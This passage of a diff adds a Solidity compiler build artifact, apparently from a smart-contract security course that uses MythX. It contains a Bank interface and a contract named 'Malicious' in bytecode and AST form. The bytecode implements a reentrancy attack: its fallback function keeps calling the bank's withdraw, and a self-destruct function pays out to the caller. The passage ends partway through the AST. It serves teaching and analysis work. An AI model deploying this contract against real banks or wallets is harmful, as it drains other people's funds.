@@ -1,0 +1,2615 @@
+{
+    "compiler": {
+        "name": "solc",
+        "version": "0.5.13+commit.5b0b510c.Emscripten.clang"
+    },
+    "updatedAt": "2019-11-15T13:39:49.195Z",
+    "sources": {
+        "/Users/joshuacassidy/DAPPS/aba-dev/aba-academy/example-code/ABDP-Cohort2-Code-Examples/Security/MythX/contracts/Bank.sol": {
+            "contracts": [
+                {
+                    "contractName": "Bank",
+                    "bytecode": "0x",
+                    "deployedBytecode": "0x",
+                    "sourceMap": "",
+                    "deployedSourceMap": ""
+                }
+            ],
+            "ast": {
+                "absolutePath": "/Users/joshuacassidy/DAPPS/aba-dev/aba-academy/example-code/ABDP-Cohort2-Code-Examples/Security/MythX/contracts/Bank.sol",
+                "exportedSymbols": {
+                    "Bank": [
+                        24
+                    ]
+                },
+                "id": 25,
+                "nodeType": "SourceUnit",
+                "nodes": [
+                    {
+                        "id": 1,
+                        "literals": [
+                            "solidity",
+                            "^",
+                            "0.5",
+                            ".0"
+                        ],
+                        "nodeType": "PragmaDirective",
+                        "src": "0:23:0"
+                    },
+                    {
+                        "baseContracts": [],
+                        "contractDependencies": [],
+                        "contractKind": "interface",
+                        "documentation": null,
+                        "fullyImplemented": false,
+                        "id": 24,
+                        "linearizedBaseContracts": [
+                            24
+                        ],
+                        "name": "Bank",
+                        "nodeType": "ContractDefinition",
+                        "nodes": [
+                            {
+                                "body": null,
+                                "documentation": null,
+                                "id": 6,
+                                "implemented": false,
+                                "kind": "function",
+                                "modifiers": [],
+                                "name": "getBalance",
+                                "nodeType": "FunctionDefinition",
+                                "parameters": {
+                                    "id": 2,
+                                    "nodeType": "ParameterList",
+                                    "parameters": [],
+                                    "src": "64:2:0"
+                                },
+                                "returnParameters": {
+                                    "id": 5,
+                                    "nodeType": "ParameterList",
+                                    "parameters": [
+                                        {
+                                            "constant": false,
+                                            "id": 4,
+                                            "name": "",
+                                            "nodeType": "VariableDeclaration",
+                                            "scope": 6,
+                                            "src": "90:4:0",
+                                            "stateVariable": false,
+                                            "storageLocation": "default",
+                                            "typeDescriptions": {
+                                                "typeIdentifier": "t_uint256",
+                                                "typeString": "uint256"
+                                            },
+                                            "typeName": {
+                                                "id": 3,
+                                                "name": "uint",
+                                                "nodeType": "ElementaryTypeName",
+                                                "src": "90:4:0",
+                                                "typeDescriptions": {
+                                                    "typeIdentifier": "t_uint256",
+                                                    "typeString": "uint256"
+                                                }
+                                            },
+                                            "value": null,
+                                            "visibility": "internal"
+                                        }
+                                    ],
+                                    "src": "89:6:0"
+                                },
+                                "scope": 24,
+                                "src": "45:51:0",
+                                "stateMutability": "view",
+                                "superFunction": null,
+                                "visibility": "external"
+                            },
+                            {
+                                "body": null,
+                                "documentation": null,
+                                "id": 11,
+                                "implemented": false,
+                                "kind": "function",
+                                "modifiers": [],
+                                "name": "deposit",
+                                "nodeType": "FunctionDefinition",
+                                "parameters": {
+                                    "id": 7,
+                                    "nodeType": "ParameterList",
+                                    "parameters": [],
+                                    "src": "115:2:0"
+                                },
+                                "returnParameters": {
+                                    "id": 10,
+                                    "nodeType": "ParameterList",
+                                    "parameters": [
+                                        {
+                                            "constant": false,
+                                            "id": 9,
+                                            "name": "",
+                                            "nodeType": "VariableDeclaration",
+                                            "scope": 11,
+                                            "src": "144:4:0",
+                                            "stateVariable": false,
+                                            "storageLocation": "default",
+                                            "typeDescriptions": {
+                                                "typeIdentifier": "t_uint256",
+                                                "typeString": "uint256"
+                                            },
+                                            "typeName": {
+                                                "id": 8,
+                                                "name": "uint",
+                                                "nodeType": "ElementaryTypeName",
+                                                "src": "144:4:0",
+                                                "typeDescriptions": {
+                                                    "typeIdentifier": "t_uint256",
+                                                    "typeString": "uint256"
+                                                }
+                                            },
+                                            "value": null,
+                                            "visibility": "internal"
+                                        }
+                                    ],
+                                    "src": "143:6:0"
+                                },
+                                "scope": 24,
+                                "src": "99:51:0",
+                                "stateMutability": "payable",
+                                "superFunction": null,
+                                "visibility": "external"
+                            },
+                            {
+                                "body": null,
+                                "documentation": null,
+                                "id": 18,
+                                "implemented": false,
+                                "kind": "function",
+                                "modifiers": [],
+                                "name": "withdraw",
+                                "nodeType": "FunctionDefinition",
+                                "parameters": {
+                                    "id": 14,
+                                    "nodeType": "ParameterList",
+                                    "parameters": [
+                                        {
+                                            "constant": false,
+                                            "id": 13,
+                                            "name": "withdrawAmount",
+                                            "nodeType": "VariableDeclaration",
+                                            "scope": 18,
+                                            "src": "171:19:0",
+                                            "stateVariable": false,
+                                            "storageLocation": "default",
+                                            "typeDescriptions": {
+                                                "typeIdentifier": "t_uint256",
+                                                "typeString": "uint256"
+                                            },
+                                            "typeName": {
+                                                "id": 12,
+                                                "name": "uint",
+                                                "nodeType": "ElementaryTypeName",
+                                                "src": "171:4:0",
+                                                "typeDescriptions": {
+                                                    "typeIdentifier": "t_uint256",
+                                                    "typeString": "uint256"
+                                                }
+                                            },
+                                            "value": null,
+                                            "visibility": "internal"
+                                        }
+                                    ],
+                                    "src": "170:21:0"
+                                },
+                                "returnParameters": {
+                                    "id": 17,
+                                    "nodeType": "ParameterList",
+                                    "parameters": [
+                                        {
+                                            "constant": false,
+                                            "id": 16,
+                                            "name": "",
+                                            "nodeType": "VariableDeclaration",
+                                            "scope": 18,
+                                            "src": "210:4:0",
+                                            "stateVariable": false,
+                                            "storageLocation": "default",
+                                            "typeDescriptions": {
+                                                "typeIdentifier": "t_uint256",
+                                                "typeString": "uint256"
+                                            },
+                                            "typeName": {
+                                                "id": 15,
+                                                "name": "uint",
+                                                "nodeType": "ElementaryTypeName",
+                                                "src": "210:4:0",
+                                                "typeDescriptions": {
+                                                    "typeIdentifier": "t_uint256",
+                                                    "typeString": "uint256"
+                                                }
+                                            },
+                                            "value": null,
+                                            "visibility": "internal"
+                                        }
+                                    ],
+                                    "src": "209:6:0"
+                                },
+                                "scope": 24,
+                                "src": "153:63:0",
+                                "stateMutability": "nonpayable",
+                                "superFunction": null,
+                                "visibility": "external"
+                            },
+                            {
+                                "body": null,
+                                "documentation": null,
+                                "id": 23,
+                                "implemented": false,
+                                "kind": "function",
+                                "modifiers": [],
+                                "name": "enroll",
+                                "nodeType": "FunctionDefinition",
+                                "parameters": {
+                                    "id": 19,
+                                    "nodeType": "ParameterList",
+                                    "parameters": [],
+                                    "src": "234:2:0"
+                                },
+                                "returnParameters": {
+                                    "id": 22,
+                                    "nodeType": "ParameterList",
+                                    "parameters": [
+                                        {
+                                            "constant": false,
+                                            "id": 21,
+                                            "name": "",
+                                            "nodeType": "VariableDeclaration",
+                                            "scope": 23,
+                                            "src": "255:4:0",
+                                            "stateVariable": false,
+                                            "storageLocation": "default",
+                                            "typeDescriptions": {
+                                                "typeIdentifier": "t_bool",
+                                                "typeString": "bool"
+                                            },
+                                            "typeName": {
+                                                "id": 20,
+                                                "name": "bool",
+                                                "nodeType": "ElementaryTypeName",
+                                                "src": "255:4:0",
+                                                "typeDescriptions": {
+                                                    "typeIdentifier": "t_bool",
+                                                    "typeString": "bool"
+                                                }
+                                            },
+                                            "value": null,
+                                            "visibility": "internal"
+                                        }
+                                    ],
+                                    "src": "254:6:0"
+                                },
+                                "scope": 24,
+                                "src": "219:42:0",
+                                "stateMutability": "nonpayable",
+                                "superFunction": null,
+                                "visibility": "external"
+                            }
+                        ],
+                        "scope": 25,
+                        "src": "25:239:0"
+                    }
+                ],
+                "src": "0:265:0"
+            },
+            "legacyAST": {
+                "attributes": {
+                    "absolutePath": "/Users/joshuacassidy/DAPPS/aba-dev/aba-academy/example-code/ABDP-Cohort2-Code-Examples/Security/MythX/contracts/Bank.sol",
+                    "exportedSymbols": {
+                        "Bank": [
+                            24
+                        ]
+                    }
+                },
+                "children": [
+                    {
+                        "attributes": {
+                            "literals": [
+                                "solidity",
+                                "^",
+                                "0.5",
+                                ".0"
+                            ]
+                        },
+                        "id": 1,
+                        "name": "PragmaDirective",
+                        "src": "0:23:0"
+                    },
+                    {
+                        "attributes": {
+                            "baseContracts": [
+                                null
+                            ],
+                            "contractDependencies": [
+                                null
+                            ],
+                            "contractKind": "interface",
+                            "documentation": null,
+                            "fullyImplemented": false,
+                            "linearizedBaseContracts": [
+                                24
+                            ],
+                            "name": "Bank",
+                            "scope": 25
+                        },
+                        "children": [
+                            {
+                                "attributes": {
+                                    "body": null,
+                                    "documentation": null,
+                                    "implemented": false,
+                                    "isConstructor": false,
+                                    "kind": "function",
+                                    "modifiers": [
+                                        null
+                                    ],
+                                    "name": "getBalance",
+                                    "scope": 24,
+                                    "stateMutability": "view",
+                                    "superFunction": null,
+                                    "visibility": "external"
+                                },
+                                "children": [
+                                    {
+                                        "attributes": {
+                                            "parameters": [
+                                                null
+                                            ]
+                                        },
+                                        "children": [],
+                                        "id": 2,
+                                        "name": "ParameterList",
+                                        "src": "64:2:0"
+                                    },
+                                    {
+                                        "children": [
+                                            {
+                                                "attributes": {
+                                                    "constant": false,
+                                                    "name": "",
+                                                    "scope": 6,
+                                                    "stateVariable": false,
+                                                    "storageLocation": "default",
+                                                    "type": "uint256",
+                                                    "value": null,
+                                                    "visibility": "internal"
+                                                },
+                                                "children": [
+                                                    {
+                                                        "attributes": {
+                                                            "name": "uint",
+                                                            "type": "uint256"
+                                                        },
+                                                        "id": 3,
+                                                        "name": "ElementaryTypeName",
+                                                        "src": "90:4:0"
+                                                    }
+                                                ],
+                                                "id": 4,
+                                                "name": "VariableDeclaration",
+                                                "src": "90:4:0"
+                                            }
+                                        ],
+                                        "id": 5,
+                                        "name": "ParameterList",
+                                        "src": "89:6:0"
+                                    }
+                                ],
+                                "id": 6,
+                                "name": "FunctionDefinition",
+                                "src": "45:51:0"
+                            },
+                            {
+                                "attributes": {
+                                    "body": null,
+                                    "documentation": null,
+                                    "implemented": false,
+                                    "isConstructor": false,
+                                    "kind": "function",
+                                    "modifiers": [
+                                        null
+                                    ],
+                                    "name": "deposit",
+                                    "scope": 24,
+                                    "stateMutability": "payable",
+                                    "superFunction": null,
+                                    "visibility": "external"
+                                },
+                                "children": [
+                                    {
+                                        "attributes": {
+                                            "parameters": [
+                                                null
+                                            ]
+                                        },
+                                        "children": [],
+                                        "id": 7,
+                                        "name": "ParameterList",
+                                        "src": "115:2:0"
+                                    },
+                                    {
+                                        "children": [
+                                            {
+                                                "attributes": {
+                                                    "constant": false,
+                                                    "name": "",
+                                                    "scope": 11,
+                                                    "stateVariable": false,
+                                                    "storageLocation": "default",
+                                                    "type": "uint256",
+                                                    "value": null,
+                                                    "visibility": "internal"
+                                                },
+                                                "children": [
+                                                    {
+                                                        "attributes": {
+                                                            "name": "uint",
+                                                            "type": "uint256"
+                                                        },
+                                                        "id": 8,
+                                                        "name": "ElementaryTypeName",
+                                                        "src": "144:4:0"
+                                                    }
+                                                ],
+                                                "id": 9,
+                                                "name": "VariableDeclaration",
+                                                "src": "144:4:0"
+                                            }
+                                        ],
+                                        "id": 10,
+                                        "name": "ParameterList",
+                                        "src": "143:6:0"
+                                    }
+                                ],
+                                "id": 11,
+                                "name": "FunctionDefinition",
+                                "src": "99:51:0"
+                            },
+                            {
+                                "attributes": {
+                                    "body": null,
+                                    "documentation": null,
+                                    "implemented": false,
+                                    "isConstructor": false,
+                                    "kind": "function",
+                                    "modifiers": [
+                                        null
+                                    ],
+                                    "name": "withdraw",
+                                    "scope": 24,
+                                    "stateMutability": "nonpayable",
+                                    "superFunction": null,
+                                    "visibility": "external"
+                                },
+                                "children": [
+                                    {
+                                        "children": [
+                                            {
+                                                "attributes": {
+                                                    "constant": false,
+                                                    "name": "withdrawAmount",
+                                                    "scope": 18,
+                                                    "stateVariable": false,
+                                                    "storageLocation": "default",
+                                                    "type": "uint256",
+                                                    "value": null,
+                                                    "visibility": "internal"
+                                                },
+                                                "children": [
+                                                    {
+                                                        "attributes": {
+                                                            "name": "uint",
+                                                            "type": "uint256"
+                                                        },
+                                                        "id": 12,
+                                                        "name": "ElementaryTypeName",
+                                                        "src": "171:4:0"
+                                                    }
+                                                ],
+                                                "id": 13,
+                                                "name": "VariableDeclaration",
+                                                "src": "171:19:0"
+                                            }
+                                        ],
+                                        "id": 14,
+                                        "name": "ParameterList",
+                                        "src": "170:21:0"
+                                    },
+                                    {
+                                        "children": [
+                                            {
+                                                "attributes": {
+                                                    "constant": false,
+                                                    "name": "",
+                                                    "scope": 18,
+                                                    "stateVariable": false,
+                                                    "storageLocation": "default",
+                                                    "type": "uint256",
+                                                    "value": null,
+                                                    "visibility": "internal"
+                                                },
+                                                "children": [
+                                                    {
+                                                        "attributes": {
+                                                            "name": "uint",
+                                                            "type": "uint256"
+                                                        },
+                                                        "id": 15,
+                                                        "name": "ElementaryTypeName",
+                                                        "src": "210:4:0"
+                                                    }
+                                                ],
+                                                "id": 16,
+                                                "name": "VariableDeclaration",
+                                                "src": "210:4:0"
+                                            }
+                                        ],
+                                        "id": 17,
+                                        "name": "ParameterList",
+                                        "src": "209:6:0"
+                                    }
+                                ],
+                                "id": 18,
+                                "name": "FunctionDefinition",
+                                "src": "153:63:0"
+                            },
+                            {
+                                "attributes": {
+                                    "body": null,
+                                    "documentation": null,
+                                    "implemented": false,
+                                    "isConstructor": false,
+                                    "kind": "function",
+                                    "modifiers": [
+                                        null
+                                    ],
+                                    "name": "enroll",
+                                    "scope": 24,
+                                    "stateMutability": "nonpayable",
+                                    "superFunction": null,
+                                    "visibility": "external"
+                                },
+                                "children": [
+                                    {
+                                        "attributes": {
+                                            "parameters": [
+                                                null
+                                            ]
+                                        },
+                                        "children": [],
+                                        "id": 19,
+                                        "name": "ParameterList",
+                                        "src": "234:2:0"
+                                    },
+                                    {
+                                        "children": [
+                                            {
+                                                "attributes": {
+                                                    "constant": false,
+                                                    "name": "",
+                                                    "scope": 23,
+                                                    "stateVariable": false,
+                                                    "storageLocation": "default",
+                                                    "type": "bool",
+                                                    "value": null,
+                                                    "visibility": "internal"
+                                                },
+                                                "children": [
+                                                    {
+                                                        "attributes": {
+                                                            "name": "bool",
+                                                            "type": "bool"
+                                                        },
+                                                        "id": 20,
+                                                        "name": "ElementaryTypeName",
+                                                        "src": "255:4:0"
+                                                    }
+                                                ],
+                                                "id": 21,
+                                                "name": "VariableDeclaration",
+                                                "src": "255:4:0"
+                                            }
+                                        ],
+                                        "id": 22,
+                                        "name": "ParameterList",
+                                        "src": "254:6:0"
+                                    }
+                                ],
+                                "id": 23,
+                                "name": "FunctionDefinition",
+                                "src": "219:42:0"
+                            }
+                        ],
+                        "id": 24,
+                        "name": "ContractDefinition",
+                        "src": "25:239:0"
+                    }
+                ],
+                "id": 25,
+                "name": "SourceUnit",
+                "src": "0:265:0"
+            },
+            "id": 0,
+            "source": "pragma solidity ^0.5.0;\n\ninterface Bank {\n\n  function getBalance() external view returns (uint);\n  function deposit() external payable returns (uint);\n  function withdraw(uint withdrawAmount) external returns (uint);\n  function enroll() external returns (bool);\n\n}\n"
+        },
+        "/Users/joshuacassidy/DAPPS/aba-dev/aba-academy/example-code/ABDP-Cohort2-Code-Examples/Security/MythX/contracts/Malicious.sol": {
+            "contracts": [
+                {
+                    "contractName": "Malicious",
+                    "bytecode": "0x608060405234801561001057600080fd5b5060405161052f38038061052f8339818101604052602081101561003357600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061049b806100946000396000f3fe608060405260043610610051576000357c0100000000000000000000000000000000000000000000000000000000900480632a7aab201461015f57806341c0e1b5146101b65780639e5faafc146101cd575b346000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16311061015d576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d346040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050602060405180830381600087803b15801561012057600080fd5b505af1158015610134573d6000803e3d6000fd5b505050506040513d602081101561014a57600080fd5b8101908080519060200190929190505050505b005b34801561016b57600080fd5b506101746101d7565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156101c257600080fd5b506101cb6101fc565b005b6101d5610215565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b3373ffffffffffffffffffffffffffffffffffffffff16ff5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e65f2a7e6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401602060405180830381600087803b15801561029a57600080fd5b505af11580156102ae573d6000803e3d6000fd5b505050506040513d60208110156102c457600080fd5b8101908080519060200190929190505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016020604051808303818588803b15801561035b57600080fd5b505af115801561036f573d6000803e3d6000fd5b50505050506040513d602081101561038657600080fd5b8101908080519060200190929190505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d346040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050602060405180830381600087803b15801561042857600080fd5b505af115801561043c573d6000803e3d6000fd5b505050506040513d602081101561045257600080fd5b81019080805190602001909291905050505056fea265627a7a72315820976cff421671b66ce082b67d058792c196db80eb436a44017a459fb9e081ecde64736f6c634300050d0032",
+                    "deployedBytecode": "0x608060405260043610610051576000357c0100000000000000000000000000000000000000000000000000000000900480632a7aab201461015f57806341c0e1b5146101b65780639e5faafc146101cd575b346000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16311061015d576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d346040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050602060405180830381600087803b15801561012057600080fd5b505af1158015610134573d6000803e3d6000fd5b505050506040513d602081101561014a57600080fd5b8101908080519060200190929190505050505b005b34801561016b57600080fd5b506101746101d7565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156101c257600080fd5b506101cb6101fc565b005b6101d5610215565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b3373ffffffffffffffffffffffffffffffffffffffff16ff5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e65f2a7e6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401602060405180830381600087803b15801561029a57600080fd5b505af11580156102ae573d6000803e3d6000fd5b505050506040513d60208110156102c457600080fd5b8101908080519060200190929190505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016020604051808303818588803b15801561035b57600080fd5b505af115801561036f573d6000803e3d6000fd5b50505050506040513d602081101561038657600080fd5b8101908080519060200190929190505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d346040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050602060405180830381600087803b15801561042857600080fd5b505af115801561043c573d6000803e3d6000fd5b505050506040513d602081101561045257600080fd5b81019080805190602001909291905050505056fea265627a7a72315820976cff421671b66ce082b67d058792c196db80eb436a44017a459fb9e081ecde64736f6c634300050d0032",
+                    "sourceMap": "47:503:1:-;;;127:81;8:9:-1;5:2;;;30:1;27;20:12;5:2;127:81:1;;;;;;;;;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;127:81:1;;;;;;;;;;;;;;;;191:11;173:10;;:30;;;;;;;;;;;;;;;;;;127:81;47:503;;;;;;",
+                    "deployedSourceMap": "47:503:1:-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;488:9;465:10;;;;;;;;;;;457:27;;;:40;454:90;;507:10;;;;;;;;;;;:19;;;527:9;507:30;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;507:30:1;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;507:30:1;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;507:30:1;;;;;;;;;;;;;;;;;454:90;47:503;70:22;;8:9:-1;5:2;;;30:1;27;20:12;5:2;70:22:1;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;212:58;;8:9:-1;5:2;;;30:1;27;20:12;5:2;212:58:1;;;:::i;:::-;;274:142;;;:::i;:::-;;70:22;;;;;;;;;;;;;:::o;212:58::-;254:10;241:24;;;274:142;313:10;;;;;;;;;;;:17;;;:19;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;313:19:1;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;313:19:1;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;313:19:1;;;;;;;;;;;;;;;;;338:10;;;;;;;;;;;:18;;;363:9;338:37;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;338:37:1;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;338:37:1;;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;338:37:1;;;;;;;;;;;;;;;;;381:10;;;;;;;;;;;:19;;;401:9;381:30;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;381:30:1;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;381:30:1;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;381:30:1;;;;;;;;;;;;;;;;;274:142::o"
+                }
+            ],
+            "ast": {
+                "absolutePath": "/Users/joshuacassidy/DAPPS/aba-dev/aba-academy/example-code/ABDP-Cohort2-Code-Examples/Security/MythX/contracts/Malicious.sol",
+                "exportedSymbols": {
+                    "Malicious": [
+                        101
+                    ]
+                },
+                "id": 102,
+                "nodeType": "SourceUnit",
+                "nodes": [
+                    {
+                        "id": 26,
+                        "literals": [
+                            "solidity",
+                            "^",
+                            "0.5",
+                            ".0"
+                        ],
+                        "nodeType": "PragmaDirective",
+                        "src": "0:23:1"
+                    },
+                    {
+                        "absolutePath": "/Users/joshuacassidy/DAPPS/aba-dev/aba-academy/example-code/ABDP-Cohort2-Code-Examples/Security/MythX/contracts/Bank.sol",
+                        "file": "./Bank.sol",
+                        "id": 27,
+                        "nodeType": "ImportDirective",
+                        "scope": 102,
+                        "sourceUnit": 25,
+                        "src": "25:20:1",
+                        "symbolAliases": [],
+                        "unitAlias": ""
+                    },
+                    {
+                        "baseContracts": [],
+                        "contractDependencies": [],
+                        "contractKind": "contract",
+                        "documentation": null,
+                        "fullyImplemented": true,
+                        "id": 101,
+                        "linearizedBaseContracts": [
+                            101
+                        ],
+                        "name": "Malicious",
+                        "nodeType": "ContractDefinition",
+                        "nodes": [
+                            {
+                                "constant": false,
+                                "id": 29,
+                                "name": "targetBank",
+                                "nodeType": "VariableDeclaration",
+                                "scope": 101,
+                                "src": "70:22:1",
+                                "stateVariable": true,
+                                "storageLocation": "default",
+                                "typeDescriptions": {
+                                    "typeIdentifier": "t_contract$_Bank_$24",
+                                    "typeString": "contract Bank"
+                                },
+                                "typeName": {
+                                    "contractScope": null,
+                                    "id": 28,
+                                    "name": "Bank",
+                                    "nodeType": "UserDefinedTypeName",
+                                    "referencedDeclaration": 24,
+                                    "src": "70:4:1",
+                                    "typeDescriptions": {
+                                        "typeIdentifier": "t_contract$_Bank_$24",
+                                        "typeString": "contract Bank"
+                                    }
+                                },
+                                "value": null,
+                                "visibility": "public"
+                            },
+                            {
+                                "anonymous": false,
+                                "documentation": null,
+                                "id": 33,
+                                "name": "LogTest",
+                                "nodeType": "EventDefinition",
+                                "parameters": {
+                                    "id": 32,
+                                    "nodeType": "ParameterList",
+                                    "parameters": [
+                                        {
+                                            "constant": false,
+                                            "id": 31,
+                                            "indexed": false,
+                                            "name": "value",
+                                            "nodeType": "VariableDeclaration",
+                                            "scope": 33,
+                                            "src": "111:10:1",
+                                            "stateVariable": false,
+                                            "storageLocation": "default",
+                                            "typeDescriptions": {
+                                                "typeIdentifier": "t_uint256",
+                                                "typeString": "uint256"
+                                            },
+                                            "typeName": {
+                                                "id": 30,
+                                                "name": "uint",
+                                                "nodeType": "ElementaryTypeName",
+                                                "src": "111:4:1",
+                                                "typeDescriptions": {
+                                                    "typeIdentifier": "t_uint256",
+                                                    "typeString": "uint256"
+                                                }
+                                            },
+                                            "value": null,
+                                            "visibility": "internal"
+                                        }
+                                    ],
+                                    "src": "110:12:1"
+                                },
+                                "src": "97:26:1"
+                            },
+                            {
+                                "body": {
+                                    "id": 44,
+                                    "nodeType": "Block",
+                                    "src": "167:41:1",
+                                    "statements": [
+                                        {
+                                            "expression": {
+                                                "argumentTypes": null,
+                                                "id": 42,
+                                                "isConstant": false,
+                                                "isLValue": false,
+                                                "isPure": false,
+                                                "lValueRequested": false,
+                                                "leftHandSide": {
+                                                    "argumentTypes": null,
+                                                    "id": 38,
+                                                    "name": "targetBank",
+                                                    "nodeType": "Identifier",
+                                                    "overloadedDeclarations": [],
+                                                    "referencedDeclaration": 29,
+                                                    "src": "173:10:1",
+                                                    "typeDescriptions": {
+                                                        "typeIdentifier": "t_contract$_Bank_$24",
+                                                        "typeString": "contract Bank"
+                                                    }
+                                                },
+                                                "nodeType": "Assignment",
+                                                "operator": "=",
+                                                "rightHandSide": {
+                                                    "argumentTypes": null,
+                                                    "arguments": [
+                                                        {
+                                                            "argumentTypes": null,
+                                                            "id": 40,
+                                                            "name": "_targetBank",
+                                                            "nodeType": "Identifier",
+                                                            "overloadedDeclarations": [],
+                                                            "referencedDeclaration": 35,
+                                                            "src": "191:11:1",
+                                                            "typeDescriptions": {
+                                                                "typeIdentifier": "t_address",
+                                                                "typeString": "address"
+                                                            }
+                                                        }
+                                                    ],
+                                                    "expression": {
+                                                        "argumentTypes": [
+                                                            {
+                                                                "typeIdentifier": "t_address",
+                                                                "typeString": "address"
+                                                            }
+                                                        ],
+                                                        "id": 39,
+                                                        "name": "Bank",
+                                                        "nodeType": "Identifier",
+                                                        "overloadedDeclarations": [],
+                                                        "referencedDeclaration": 24,
+                                                        "src": "186:4:1",
+                                                        "typeDescriptions": {
+                                                            "typeIdentifier": "t_type$_t_contract$_Bank_$24_$",
+                                                            "typeString": "type(contract Bank)"
+                                                        }
+                                                    },
+                                                    "id": 41,
+                                                    "isConstant": false,
+                                                    "isLValue": false,
+                                                    "isPure": false,
+                                                    "kind": "typeConversion",
+                                                    "lValueRequested": false,
+                                                    "names": [],
+                                                    "nodeType": "FunctionCall",
+                                                    "src": "186:17:1",
+                                                    "typeDescriptions": {
+                                                        "typeIdentifier": "t_contract$_Bank_$24",
+                                                        "typeString": "contract Bank"
+                                                    }
+                                                },
+                                                "src": "173:30:1",
+                                                "typeDescriptions": {
+                                                    "typeIdentifier": "t_contract$_Bank_$24",
+                                                    "typeString": "contract Bank"
+                                                }
+                                            },
+                                            "id": 43,
+                                            "nodeType": "ExpressionStatement",
+                                            "src": "173:30:1"
+                                        }
+                                    ]
+                                },
+                                "documentation": null,
+                                "id": 45,
+                                "implemented": true,
+                                "kind": "constructor",
+                                "modifiers": [],
+                                "name": "",
+                                "nodeType": "FunctionDefinition",
+                                "parameters": {
+                                    "id": 36,
+                                    "nodeType": "ParameterList",
+                                    "parameters": [
+                                        {
+                                            "constant": false,
+                                            "id": 35,
+                                            "name": "_targetBank",
+                                            "nodeType": "VariableDeclaration",
+                                            "scope": 45,
+                                            "src": "139:19:1",
+                                            "stateVariable": false,
+                                            "storageLocation": "default",
+                                            "typeDescriptions": {
+                                                "typeIdentifier": "t_address",
+                                                "typeString": "address"
+                                            },
+                                            "typeName": {
+                                                "id": 34,
+                                                "name": "address",
+                                                "nodeType": "ElementaryTypeName",
+                                                "src": "139:7:1",
+                                                "stateMutability": "nonpayable",
+                                                "typeDescriptions": {
+                                                    "typeIdentifier": "t_address",
+                                                    "typeString": "address"
+                                                }
+                                            },
+                                            "value": null,
+                                            "visibility": "internal"
+                                        }
+                                    ],
+                                    "src": "138:21:1"
+                                },
+                                "returnParameters": {
+                                    "id": 37,
+                                    "nodeType": "ParameterList",
+                                    "parameters": [],
+                                    "src": "167:0:1"
+                                },
+                                "scope": 101,
+                                "src": "127:81:1",
+                                "stateMutability": "nonpayable",
+                                "superFunction": null,
+                                "visibility": "public"
+                            },
+                            {
+                                "body": {
+                                    "id": 53,
+                                    "nodeType": "Block",
+                                    "src": "235:35:1",
+                                    "statements": [
+                                        {
+                                            "expression": {
+                                                "argumentTypes": null,
+                                                "arguments": [
+                                                    {
+                                                        "argumentTypes": null,
+                                                        "expression": {
+                                                            "argumentTypes": null,
+                                                            "id": 49,
+                                                            "name": "msg",
+                                                            "nodeType": "Identifier",
+                                                            "overloadedDeclarations": [],
+                                                            "referencedDeclaration": 116,
+                                                            "src": "254:3:1",
+                                                            "typeDescriptions": {
+                                                                "typeIdentifier": "t_magic_message",
+                                                                "typeString": "msg"
+                                                            }
+                                                        },
+                                                        "id": 50,
+                                                        "isConstant": false,
+                                                        "isLValue": false,
+                                                        "isPure": false,
+                                                        "lValueRequested": false,
+                                                        "memberName": "sender",
